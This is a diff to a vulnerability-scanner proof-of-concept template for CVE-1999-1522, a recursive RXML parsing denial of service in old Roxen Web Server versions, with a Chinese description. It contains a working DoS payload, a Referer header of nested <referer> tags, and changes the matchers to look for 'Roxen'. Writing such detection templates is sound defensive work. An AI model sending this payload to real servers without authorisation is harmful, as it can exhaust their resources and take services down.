@@ -1,17 +1,22 @@
 [info]
-author = "ave"
-description = "Roxen Web Server 1.3.11 及更早版本 htmlparse.pike 递归解析拒绝服务漏洞验证，通过发送包含深层嵌套 RXML referer 标签的 HTTP 请求触发服务异常"
+author = "AVE"
+description = "检测 Roxen Web Server 1.3.11 及更早版本中 htmlparse.pike 模块递归解析导致的拒绝服务漏洞。RXML 解析器递归处理 <referer> 标签时未对客户端输入的 Referer HTTP 头进行正确引用或阻止递归解析，发送包含递归 RXML 标签的 Referer 头可触发无限递归，耗尽服务器资源。参考 Bugtraq 公告 http://marc.info/?l=bugtraq&m=93942579008408&w=2"
 id = "POC-AVE-1999-1158"
-name = "CVE-1999-1522 PoC"
+name = "Roxen Web Server htmlparse.pike Recursive Parsing DoS PoC"
 severity = "medium"
-tags = ["ave-1999-1158"]
+tags = [
+    "cve-1999-1522",
+    "roxen",
+    "rxml",
+    "dos",
+]
 vuln_id = [
     "CVE-1999-1522",
     "AVE-1999-1158",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
@@ -19,23 +24,16 @@ path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.headers]
-Referer = "<referer><referer><referer><referer><referer><referer><referer><referer><referer><referer>"
+Referer = "<referer><referer><referer><referer>"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    500,
-    502,
-    503,
-]
-type = "status"
+part = "header"
+type = "word"
+words = ["Roxen"]
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "error",
-    "stack overflow",
-    "internal error",
-]
+words = ["Roxen"]
